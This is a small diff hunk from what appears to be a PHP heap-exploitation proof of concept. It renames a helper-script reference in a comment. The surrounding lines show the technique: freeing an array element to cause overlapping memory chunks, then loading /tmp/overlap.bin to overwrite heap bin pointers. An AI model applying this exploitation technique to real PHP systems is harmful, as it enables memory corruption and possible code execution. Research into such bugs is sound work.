@@ -51,7 +51,7 @@ var_dump('');   	//simulate bug
 unset($arr[6]);     //huge chunk munmap with size of chunk arr[7] --> overlap
 
 // fill $arr[8] via overlap.bin file
-// generate.py creates overlap.bin  
+// generate_overlap.py creates overlap.bin  
 $arr[8] = file_get_contents('/tmp/overlap.bin');			//overlap chunk 2 -- overwrite bin 26 ptrs
 
 var_dump('');   	//breakpoint stop ---> we can see memory overlapped chunks
